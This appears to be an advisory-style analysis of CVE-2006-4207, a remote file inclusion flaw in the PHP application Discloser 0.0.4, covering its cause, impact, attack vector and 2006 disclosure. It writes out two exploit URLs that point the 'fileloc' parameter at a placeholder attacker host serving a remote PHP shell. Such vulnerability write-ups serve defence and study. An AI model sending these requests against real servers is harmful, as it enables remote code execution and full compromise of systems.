Based on the provided information, here's an analysis of CVE-2006-4207:

**Vulnerability Details:**

*   **Root Cause:** The vulnerability is a Remote File Inclusion (RFI) flaw in the Discloser 0.0.4 application.
*   **Weakness:** The application improperly handles the `fileloc` parameter in `content/content.php` and `inc/indexhead.php` files. This allows an attacker to include a remote file containing malicious code.
*   **Impact of Exploitation:** Successful exploitation allows an attacker to execute arbitrary code on the server by including and running a malicious PHP script from a remote server. This can lead to complete compromise of the affected system.
*   **Attack Vectors:** The vulnerability can be exploited by sending a crafted HTTP request to the vulnerable scripts (`content/content.php` and `inc/indexhead.php`), modifying the `fileloc` parameter to point to a malicious remote PHP script.
*   **Required Attacker Capabilities/Position:** The attacker needs to be able to send HTTP requests to the vulnerable application. There are no specific required attacker capabilities beyond that.

**Technical Details:**

*   The exploit is triggered by manipulating the `fileloc` parameter in the following URLs:
    *   `http://[Target]/[Path]/content/content.php?fileloc=http://www.evalsite.com/shell.php?`
    *   `http://[Target]/[Path]/inc/indexhead.php?fileloc= http://www.evalsite.com/shell.php?`
*   The attacker-controlled `fileloc` parameter specifies the URL of the malicious script. The application then includes and executes this script, resulting in remote code execution.
*   The exploit was publicly disclosed on August 15, 2006, by Arash RJ of the PersianFox Digital Security Team.

**Additional Details:**

*   The vulnerable application is Discloser version 0.0.4.
*   The application is written in PHP.
